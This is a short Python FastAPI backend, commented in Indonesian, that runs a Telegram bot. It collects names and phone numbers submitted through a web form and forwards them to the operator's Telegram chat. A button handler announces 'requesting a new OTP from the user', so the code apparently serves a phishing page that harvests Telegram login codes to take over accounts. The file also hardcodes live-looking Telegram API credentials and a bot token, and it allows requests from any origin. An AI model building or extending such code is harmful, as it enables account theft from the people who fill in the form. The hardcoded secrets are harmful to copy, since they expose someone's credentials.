from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, events
import os

app = FastAPI()

# Izinkan Frontend mengakses Backend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Ambil Variabel dari Railway (Tab Variables)
API_ID = os.getenv('API_ID', '33714700')
API_HASH = os.getenv('API_HASH', '9319b6d061a62e30b6a247cdff6aaf91')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8244385359:AAG7b2VCv_o5_miHQ7LXWn3-SbyqFPZLHCY')

# Inisialisasi Bot Client
bot_client = TelegramClient('bot_session', int(API_ID), API_HASH)

@app.on_event("startup")
async def startup_event():
    # Menjalankan bot saat server mulai
    await bot_client.start(bot_token=BOT_TOKEN)
    print("Bot is running...")

@app.post("/register")
async def register(request: Request):
    data = await request.json()
    nama = data.get("name")
    phone = data.get("phone")
    
    # Kirim notifikasi ke kamu saat ada yang isi form
    await bot_client.send_message('me', f"Ada pendaftar baru!\nNama: {nama}\nNomor: {phone}")
    
    return {"status": "success", "message": "Data berhasil dikirim ke bot"}

@app.get("/")
async def root():
    return {"message": "Backend is Online!"}

# Handler untuk tombol atau callback (Perbaikan dari Screenshot 214)
@bot_client.on(events.CallbackQuery(data=b'req'))
async def handler(event):
    await event.answer("Meminta OTP Baru ke User...", alert=False)